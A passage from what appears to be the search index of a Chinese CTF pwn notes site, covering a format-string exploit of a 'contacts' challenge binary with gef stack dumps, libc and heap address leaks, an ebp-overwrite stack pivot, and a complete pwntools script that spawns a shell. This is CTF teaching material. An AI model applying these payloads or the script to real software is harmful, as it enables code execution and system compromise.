\u51fd\u6570\u4e2d\u5b58\u50a8 ebp \u7684\u5730\u5740\u6bcf\u6b21\u90fd\u5728\u53d8\u5316\uff0c\u800c\u6211\u4eec\u4e5f\u65e0\u6cd5\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5f97\u77e5\u3002\u4f46\u662f\uff0c \u7a0b\u5e8f\u4e2d\u538b\u5165\u6808\u4e2d\u7684 ebp \u503c\u5176\u5b9e\u4fdd\u5b58\u7684\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u4fdd\u5b58 ebp \u503c\u7684\u5730\u5740 \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5176**\u4e0a\u5c42\u51fd\u6570\u7684\u4fdd\u5b58\u7684 ebp \u7684\u503c\uff0c\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\uff08\u5373 main \u51fd\u6570\uff09\u7684 ebp \u6570\u503c**\u3002\u8fd9\u6837\u5f53\u4e0a\u5c42\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5373\u5b9e\u73b0\u4e86\u5c06\u6808\u8fc1\u79fb\u5230\u5806\u7684\u64cd\u4f5c\u3002 \u57fa\u672c\u601d\u8def\u5982\u4e0b \u9996\u5148\u83b7\u53d6 system \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u67d0\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6839\u636e libc database \u786e\u5b9a\u3002 \u6784\u9020\u57fa\u672c\u8054\u7cfb\u4eba\u63cf\u8ff0\u4e3a system_addr + 'bbbb' + binsh_addr \u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u4fdd\u5b58\u7684 ebp(\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\u7684 ebp) \u4e3a**\u5b58\u50a8 system_addr \u7684\u5730\u5740 -4**\u3002 \u6ce8\u89e3 \uff1a \u4e3a\u4ec0\u662f**system_addr \u7684\u5730\u5740 -4** \uff1f\u662f\u56e0\u4e3a\u7a0b\u5e8f\u672b\u5c3e\u7684 leave;ret \u6267\u884c\u5b8c leave \u540e\uff0cesp \u662f\u6307\u5411 ebp \u7684\uff0c\u7136\u540e esp \u7684\u503c\u4f1a\u589e\u52a0\u4e00\u4e2a\u673a\u5668\u957f\u5ea6\uff08\u8fd9\u65f6 esp \u521a\u597d\u662f\u6307\u5411 eip \uff09\uff0c\u518d\u6267\u884c ret \u5c06 esp \u6307\u5411\u7684\u503c\u538b\u5165 eip \u4e2d\u3002 \u5f53\u4e3b\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u4f1a\u6709\u5982\u4e0b\u64cd\u4f5c\uff08\u7b2c\u4e00\u7b2c\u4e8c\u5408\u5e76\u7b49\u4e8e leave \uff09 move esp,ebp\uff0c\u5c06 esp \u6307\u5411 system_addr \u7684\u5730\u5740 - 4 pop ebp\uff0c \u5c06 esp \u6307\u5411 system_addr ret\uff0c\u5c06 eip \u6307\u5411 system_addr\uff0c\u4ece\u800c\u83b7\u53d6 shell\u3002","title":"\u5229\u7528\u601d\u8def"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_27","text":"\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u3001/bin/sh \u5730\u5740\uff0c\u6808\u4e0a\u5b58\u50a8\u8054\u7cfb\u4eba\u63cf\u8ff0\u7684\u5730\u5740\uff0c\u4ee5\u53ca PrintInfo \u51fd\u6570\u7684\u5730\u5740\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6839\u636e\u6808\u4e0a\u5b58\u50a8\u7684 libc_start_main_ret \u5730\u5740 (\u8be5\u5730\u5740\u662f\u5f53 main \u51fd\u6570\u6267\u884c\u8fd4\u56de\u65f6\u4f1a\u8fd0\u884c\u7684\u51fd\u6570) \u6765\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u3001/bin/sh \u5730\u5740\u3002\u6211\u4eec\u6784\u9020\u76f8\u5e94\u7684\u8054\u7cfb\u4eba\uff0c\u7136\u540e\u9009\u62e9\u8f93\u51fa\u8054\u7cfb\u4eba\u4fe1\u606f\uff0c\u5e76\u5c06\u65ad\u70b9\u4e0b\u5728 printf \u5904\uff0c\u5e76\u4e14\u4e00\u76f4\u8fd0\u884c\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684 printf \u51fd\u6570\u5904\uff0c\u5982\u4e0b \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420 \"1234567\\n\") [ #1] 0x8048c27 \u2192 leave [ #2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 [ #3] 0x80487a2 \u2192 jmp 0x80487b3 [ #4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c) [ #5] 0x80485e1 \u2192 hlt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 dereference $esp 140 [ '$esp' , '140' ] 1 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp gef\u27a4 dereference $esp l140 [ '$esp' , 'l140' ] 140 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp 0xffffcd1c\u2502+0x20: 0x08048c99 \u2192 add DWORD PTR [ ebp-0xc ] , 0x1 0xffffcd20\u2502+0x24: 0x0804b0a8 \u2192 \"11111\" 0xffffcd24\u2502+0x28: 0x00002b67 ( \"g+\" ? ) 0xffffcd28\u2502+0x2c: 0x0804c410 \u2192 \"11111\" 0xffffcd2c\u2502+0x30: 0x0804c420 \u2192 \"1234567\" 0xffffcd30\u2502+0x34: 0xf7fadd60 \u2192 0xfbad2887 0xffffcd34\u2502+0x38: 0x08048ed6 \u2192 0x25007325 ( \"%s\" ? ) 0xffffcd38\u2502+0x3c: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd3c\u2502+0x40: 0x00000000 0xffffcd40\u2502+0x44: 0xf7fad000 \u2192 0x001b1db0 0xffffcd44\u2502+0x48: 0x00000000 0xffffcd48\u2502+0x4c: 0xffffcd78 \u2192 0x00000000 0xffffcd4c\u2502+0x50: 0x080487a2 \u2192 jmp 0x80487b3 0xffffcd50\u2502+0x54: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd54\u2502+0x58: 0xffffcd68 \u2192 0x00000004 0xffffcd58\u2502+0x5c: 0x00000050 ( \"P\" ? ) 0xffffcd5c\u2502+0x60: 0x00000000 0xffffcd60\u2502+0x64: 0xf7fad3dc \u2192 0xf7fae1e0 \u2192 0x00000000 0xffffcd64\u2502+0x68: 0x08048288 \u2192 0x00000082 0xffffcd68\u2502+0x6c: 0x00000004 0xffffcd6c\u2502+0x70: 0x0000000a 0xffffcd70\u2502+0x74: 0xf7fad000 \u2192 0x001b1db0 0xffffcd74\u2502+0x78: 0xf7fad000 \u2192 0x001b1db0 0xffffcd78\u2502+0x7c: 0x00000000 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 0xffffcd80\u2502+0x84: 0x00000001 0xffffcd84\u2502+0x88: 0xffffce14 \u2192 0xffffd00d \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]\" 0xffffcd88\u2502+0x8c: 0xffffce1c \u2192 0xffffd058 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5224\u65ad\u53ef\u4ee5\u5f97\u5230 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 \u5b58\u50a8\u7684\u662f __libc_start_main \u7684\u8fd4\u56de\u5730\u5740\uff0c\u540c\u65f6\u5229\u7528 fmtarg \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a 32\uff0c\u90a3\u4e48\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 31\uff08\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728 0xffffcd00 \uff09\u3002 gef\u27a4 fmtarg 0xffffcd7c The index of format argument : 32 \u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u8fdb\u800c\u53ef\u4ee5\u6839\u636e libc-database \u6765\u83b7\u53d6\u5bf9\u5e94\u7684 libc\uff0c\u7ee7\u800c\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u4e0e /bin/sh \u51fd\u6570\u5730\u5740\u4e86\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740 0xffffcd2c \u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 11\uff0c\u5f97\u5230\u8fd9\u4e2a\u662f\u4e3a\u4e86\u5bfb\u5740\u5806\u4e2d\u6307\u5b9a\u8054\u7cfb\u4eba\u7684 Description \u7684\u5185\u5b58\u9996\u5730\u5740\uff0c\u6211\u4eec\u5c06\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 [system_addr][bbbb][binsh_addr][%6p][p][p][bbbb] \u4fdd\u5b58\u5728\u6307\u5b9a\u8054\u7cfb\u4eba\u7684 Description \u4e2d\u3002 \u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u4e0b\u9762\u7684\u5730\u5740\u4fdd\u5b58\u7740\u4e0a\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5730\u5740\uff0c\u5176\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 6\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u5b58\u50a8\u7684 ebp \u7684\u503c\u3002 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp","title":"\u83b7\u53d6\u76f8\u5173\u5730\u5740\u4e0e\u504f\u79fb"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_28","text":"\u5f97\u77e5\u4e0a\u9762\u7684\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u83b7\u53d6\u5806\u5730\u5740\u4e0e\u76f8\u5e94\u7684 ebp \u5730\u5740\u3002 [ system_addr ][ bbbb ][ binsh_addr ][ %6 $p ][ %11 $p ][ bbbb ] \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u76f8\u5e94\u7684\u5730\u5740\u3002\u540e\u9762\u7684 bbbb \u662f\u4e3a\u4e86\u63a5\u53d7\u5b57\u7b26\u4e32\u65b9\u4fbf\u3002 \u8fd9\u91cc\u56e0\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\u6240\u7533\u8bf7\u7684\u6808\u7a7a\u95f4\u4e0e\u91ca\u653e\u7684\u7a7a\u95f4\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u7684 ebp \u5730\u5740\u5e76\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002 \u6ce8\u89e3 \uff1a \u56e0\u4e3a PrintInfo \u80af\u5b9a\u662f\u901a\u8fc7 main \u51fd\u6570\u8c03\u7528\u7684\uff0c\u800c main \u51fd\u6570\u4e00\u76f4\u6ca1\u6709\u7ed3\u675f\uff0c\u4e5f\u5c31\u662f\u4e00\u76f4\u5728\u5185\u5b58\u7684\u67d0\u4e00\u56fa\u5b9a\u4f4d\u7f6e\u3002PrintInfo \u662f\u5728 main \u6808\u57fa\u7840\u4e0a\u5f80\u4f4e\u5730\u5740\u751f\u957f\u7684\uff0c\u6240\u4ee5\u53ea\u6709 PrintInfo \u7ed3\u6784\u56fa\u5b9a ebp \u5730\u5740\u4e5f\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002PrintInfo \u7ed3\u6784\u56fa\u5b9a\u662f\u56e0\u4e3a\u6240\u6709\u8f93\u51fa\u5185\u5bb9\uff08\u53f7\u7801\u3001\u63cf\u8ff0\u7b49\uff09\u90fd\u662f\u4ee5\u5806\u5806\u6307\u9488\u5f62\u5f0f\u5b58\u50a8\u7684\uff0c\u4e5f\u5c31\u662f\u65e0\u8bba\u957f\u5ea6\u5982\u4f55\u53d8\u5316\u5728\u6808\u4e0a\u6240\u5728\u7a7a\u95f4\u90fd\u662f\u4e0d\u53d8\u7684\uff0cebp \u7684\u504f\u79fb\u4e5f\u5c31\u662f\u56fa\u5b9a\u4e86\u3002 \u5728\u90e8\u5206\u73af\u5883\u4e0b\uff0csystem \u5730\u5740\u4f1a\u51fa\u73b0 x00\uff0c\u5bfc\u81f4 printf \u7684\u65f6\u5019\u51fa\u73b0 0 \u622a\u65ad\u5bfc\u81f4\u65e0\u6cd5\u6cc4\u9732\u4e24\u4e2a\u5730\u5740\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06 payload \u7684\u4fee\u6539\u5982\u4e0b\uff1a [ %6 $p ][ %11 $p ][ ccc ][ system_addr ][ bbbb ][ binsh_addr ][ dddd ] payload \u4fee\u6539\u4e3a\u8fd9\u6837\u7684\u8bdd\uff0c\u8fd8\u9700\u8981\u5728 heap \u4e0a\u52a0\u5165 12 \u7684\u504f\u79fb\u3002\u8fd9\u6837\u4fdd\u8bc1\u4e86 0 \u622a\u65ad\u51fa\u73b0\u5728\u6cc4\u9732\u4e4b\u540e\u3002 [%6$p] \uff1a\u4e0a\u5c42\u51fd\u6570 ebp \u5730\u5740\uff1b [%11$p] \uff1a\u5806\u5757 fd \u6307\u9488\u5730\u5740\uff1b","title":"\u6784\u9020\u8054\u7cfb\u4eba\u83b7\u53d6\u5806\u5730\u5740"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#ebp","text":"\u7531\u4e8e\u6211\u4eec\u9700\u8981\u6267\u884c leave\uff08 move \u6307\u4ee4\u5c06 ebp \u8d4b\u7ed9 esp\uff0c\u5e76\u8fd8\u9700\u8981\u6267\u884c pop ebp \uff09\u624d\u4f1a\u6267\u884c ret \u6307\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06 ebp \u4fee\u6539\u4e3a\u5b58\u50a8 system \u5730\u5740 -4 \u7684\u503c\u3002\u8fd9\u6837 move esp,ebp \u4e4b\u540e\uff0cesp \u6070\u597d\u6307\u5411\u4fdd\u5b58 system \u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5728\u6267\u884c ret \u6307\u4ee4\u5373\u53ef\u6267\u884c system \u51fd\u6570\u3002 \u4e0a\u9762\u5df2\u7ecf\u5f97\u77e5\u4e86\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684 ebp \u503c\uff0c\u800c\u4e5f\u77e5\u9053\u4e86\u5bf9\u5e94\u7684\u504f\u79fb\u4e3a 6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684 payload \u6765\u8fdb\u884c\u4fee\u6539\u76f8\u5e94\u7684\u503c\u3002(\u8fd9\u91cc\u662f wiki \u7684\u4fee\u6539\u65b9\u6cd5\uff0c\u56e0\u4e3awiki exp \u6211\u672c\u5730\u6253\u4e0d\u901a\uff0c\u6362\u6210\u81ea\u5df1\u7684\uff0c\u6240\u4ee5\u4fee\u6539\u65b9\u6cd5\u4e5f\u4e0d\u4e00\u6837) part1 = ( heap_addr - 4 ) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str ( part1 ) + 'x%' + str ( part2 ) + 'x%6$n'","title":"\u4fee\u6539 ebp"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#shell","text":"\u8fd9\u65f6\uff0c\u6267\u884c\u5b8c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4e4b\u540e\uff0c\u9000\u51fa\u5230\u4e0a\u4e0a\u51fd\u6570\uff0c\u6211\u4eec\u8f93\u5165 5 \uff0c\u9000\u51fa\u7a0b\u5e8f\u5373\u4f1a\u6267\u884c ret \u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6 shell\u3002","title":"\u83b7\u53d6 shell"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_29","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : contacts.py from pwn import * context . log_level = 'debug' p = process ( \"./contacts\" ) elf = ELF ( \"./contacts\" ) #libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\") # \u4f7f\u7528\u9898\u76ee\u63d0\u4f9b\u7684libc libc = ELF ( \"./libc.so\" ) def creat ( name , number , length , description ): p . sendlineafter ( \">>> \" , '1' ) p . sendlineafter ( \"Name: \" , name ) p . sendlineafter ( \"No: \" , number ) p . sendlineafter ( \"description: \" , str ( length )) p . sendlineafter ( \"description: \\n \" , description ) def free ( name ): p . sendlineafter ( \">>> \" , '2' ) p . sendlineafter ( \"remove? \" , name ) def edit ( name , choose , newname = 'skye' , length = 10 , description = 'skye' ): p . sendlineafter ( \">>> \" , '3' ) p . sendlineafter ( \"change? \" , name ) p . sendlineafter ( \">>> \" , str ( choose )) if ( choose == 1 ): p . sendlineafter ( \"name: \" , newname ) elif ( choose == 2 ): p . sendlineafter ( \"description: \" , str ( length )) p . sendlineafter ( \"Description: \\n \" , description ) def show (): p . sendlineafter ( \">>> \" , '4' ) # leak libc creat ( \"skye\" , \"skye\" , 24 , 'a' * 4 + \"%31$p\" ) show () p . recvuntil ( 'a' * 4 ) libc_start_main = int ( p . recv ( 10 ), 16 ) log . info ( \"libc_start_main:\" + hex ( libc_start_main )) libc_base = libc_start_main - 0x18637 log . info ( \"libc_base:\" + hex ( libc_base )) system_addr = libc_base + libc . symbols [ 'system' ] log . info ( \"system_addr:\" + hex ( system_addr )) binsh_addr = libc_base + libc . search ( 'sh \\x00 ' ) . next () log . info ( \"binsh_addr:\" + hex ( binsh_addr )) # leak ebp&heap addr # \u5c06system\u524d\u7f6e\u53ef\u80fd\u4f1a\u9047\u5230\\x00\u963b\u65ad\uff0c\u53ef\u81ea\u884c\u540e\u7f6e\uff0c\u5e76\u8c03\u6574ebp\u8986\u76d6\u503c payload = p32 ( system_addr ) + 'bbbb' + p32 ( binsh_addr ) + '%6$p%11$pcccc' creat ( '2222' , 'skye' , 0x20 , payload ) show () p . recvuntil ( 'Description: ' ) data = p . recvuntil ( 'cccc' , drop = True ) data = data . split ( '0x' ) ebp_addr = int ( data [ - 2 ], 16 ) log . info ( \"ebp_addr:\" + hex ( ebp_addr )) heap_addr = int ( data [ - 1 ], 16 ) log . info ( \"heap_addr:\" + hex ( heap_addr )) # overwrite main_ebp payload = '% {} c%6$n' . format ( str ( heap_addr - 4 )) creat ( '3333' , 'skye' , 68 , payload ) #gdb.attach(p,'b *0x0804876A') #raw_input('pause') show () #getshell p . recvuntil ( '>>> ' ) p . sendline ( '5' ) p . interactive () \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u6837\u5e76\u4e0d\u80fd\u7a33\u5b9a\u5f97\u5230 shell\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u6b21\u6027\u8f93\u5165\u4e86\u592a\u957f\u7684\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u6211\u4eec\u53c8\u6ca1\u6709\u529e\u6cd5\u5728\u524d\u9762\u63a7\u5236\u6240\u60f3\u8981\u8f93\u5165\u7684\u5730\u5740\u3002\u53ea\u80fd\u8fd9\u6837\u4e86\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981\u6253\u5370\u8fd9\u4e48\u591a\u5462\uff1f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e0d\u5728\u6808\u4e0a\uff0c\u6240\u4ee5\u5c31\u7b97\u6211\u4eec\u5f97\u5230\u4e86\u9700\u8981\u66f4\u6539\u7684 ebp \u7684\u5730\u5740\uff0c\u4e5f\u6ca1\u6709\u529e\u6cd5\u53bb\u628a\u8fd9\u4e2a\u5730\u5740\u5199\u5230\u6808\u4e0a\uff0c\u5229\u7528 $ \u7b26\u53f7\u53bb\u5b9a\u4f4d\u4ed6\uff1b\u56e0\u4e3a\u6ca1\u6709\u529e\u6cd5\u5b9a\u4f4d\uff0c\u6240\u4ee5\u6ca1\u6709\u529e\u6cd5\u7528 hn\\hhn \u7b49\u65b9\u5f0f\u53bb\u5199\u8fd9\u4e2a\u5730\u5740\uff0c\u53ea\u80fd\u7528 n \u65b9\u5f0f\u53bb\u5199\uff0c\u6240\u4ee5\u6253\u5370\u5f88\u591a\u3002 \u6ce8\u89e3 \uff1a \u6211\u7684\u811a\u672c\u4e2d\u7528\u7684\u4e0d\u662f system('/bin/sh') \uff0c\u800c\u662f system('sh') \uff0c\u8fd9\u662f\u56e0\u4e3a\u7528\u9898\u76ee\u63d0\u4f9b\u7684 libc \u641c\u7d22 /bin/sh \u5f97\u5230\u7ed3\u679c\u6709\u8bef\uff0c\u5f97\u5230\u7684\u5730\u5740\u4e0d\u662f /bin/sh \uff1a \u800c\u53bb\u5230 libcdatabase \u5f97\u5230\u7ed3\u679c\u662f\uff1a 0xf7f60a0b \uff0c\u91cc\u9762\u6709\u4e00\u4e2a 0x0a \u5c31\u662f\u6362\u884c\u7b26\u561b\uff0c\u8fd9\u6837\u4f1a\u63d0\u524d\u7ec8\u6b62\u8f93\u5165\uff0c\u6240\u4ee5\u4e5f\u4e0d\u884c\u3002\u6700\u540e\u4f7f\u7528\u9898\u76ee\u63d0\u4f9b libc \u641c\u7d22 sh \uff0c\u6210\u529f getshell \u3002 \u5728\u6211\u7684\u73af\u5883\uff08Ubuntu 16.04\uff09\u6ca1\u6709\u9047\u5230 system \\x00 \u963b\u65ad\uff0c\u6240\u4ee5 payload \u4e2d system \u524d\u7f6e\u3002\u5982\u679c\u9047\u5230\u963b\u65ad\uff0c\u5c31\u5c06 system \u540e\u7f6e\uff0c\u5e76\u8c03\u6574 ebp \u8986\u76d6\u5185\u5bb9\u52a0\u4e0a\u504f\u79fb\u5373\u53ef\u3002","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_30","text":"ctf-wiki \u4e0a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4ecb\u7ecd\u4e0d\u662f\u5f88\u5168\u9762\uff0c\u6211\u67e5\u4e86\u5176\u4ed6\u5927\u4f6c\u7684\u7b14\u8bb0\uff0c\u81ea\u5df1\u603b\u7ed3\u4e86\uff1a Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_31","text":"\u6240\u8c13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u8fdb\u884c pwn\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP \u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c 